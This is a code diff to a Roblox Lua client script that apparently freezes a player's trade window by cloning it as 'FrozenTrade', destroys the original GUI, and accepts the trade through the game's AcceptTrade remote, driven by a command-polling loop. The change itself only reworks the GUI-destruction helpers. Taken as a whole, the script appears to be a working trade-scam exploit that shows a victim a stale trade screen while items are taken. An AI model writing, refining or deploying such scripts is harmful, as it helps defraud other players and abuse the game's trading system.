@@ -5,7 +5,7 @@ local LocalPlayer = Players.LocalPlayer
 local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
 local TradeGuiPhone = PlayerGui:WaitForChild("TradeGUI_Phone")
 
-local clonedGui = nil
+local clonedGui = nil  -- (This is still used when cloning, but we no longer rely on it for destruction.)
 
 local function freezeTradeGui()
     if TradeGuiPhone then
@@ -31,40 +31,41 @@ local function freezeTradeGui()
     end
 end
 
-local function destroyClonedGui()
-    -- Destroy the cloned GUI and all its descendants
-    if clonedGui then
-        -- Iterate over all descendants of the cloned GUI and destroy them
-        for _, descendant in pairs(clonedGui:GetDescendants()) do
-            descendant:Destroy()  -- Destroy each descendant inside the cloned GUI
-        end
-
-        -- Destroy the cloned GUI itself
-        clonedGui:Destroy()  -- Finally destroy the cloned GUI object
-        clonedGui = nil  -- Clear the reference
-        print("Cloned Trade GUI and all its contents have been destroyed.")
+-- Recursive destruction helper:
+local function recursiveDestroy(inst)
+    for _, child in ipairs(inst:GetChildren()) do
+        recursiveDestroy(child)
     end
+    print("Destroying instance:", inst:GetFullName())
+    inst:Destroy()
+end
+
+-- Destroys all clones with the name "FrozenTrade"
+local function destroyAllClonedGUIs()
+    local playerGui = game:GetService("Players").LocalPlayer.PlayerGui
+    for _, child in ipairs(playerGui:GetChildren()) do
+        if child.Name == "FrozenTrade" then
+            recursiveDestroy(child)
+        end
+    end
+    print("All FrozenTrade clones have been destroyed.")
 end
 
 local function destroyOriginalGui()
-    -- Destroy the original Trade GUI
     if TradeGuiPhone then
-        TradeGuiPhone:Destroy()  -- Destroy the original Trade GUI
+        TradeGuiPhone:Destroy()
         print("Original Trade GUI has been destroyed.")
     end
 end
 
 local function destroyBothGUIs()
-    -- Destroy both the cloned and original GUIs
-    destroyClonedGui()
+    destroyAllClonedGUIs()
     destroyOriginalGui()
 end
 
 -- Function to accept the trade
 local function acceptTrade()
-    local acc = {
-        [1] = 285646582
-    }
+    local acc = { [1] = 285646582 }
     ReplicatedStorage.Trade.AcceptTrade:FireServer(unpack(acc))
     print("Trade accepted via remote.")
 end
@@ -121,5 +122,5 @@ end
 -- Check for commands every 0.5 seconds
 while true do
     checkForCommands()
-    wait(0.5)  -- Adjusted to a more reasonable check interval
+    wait(0.5)
 end
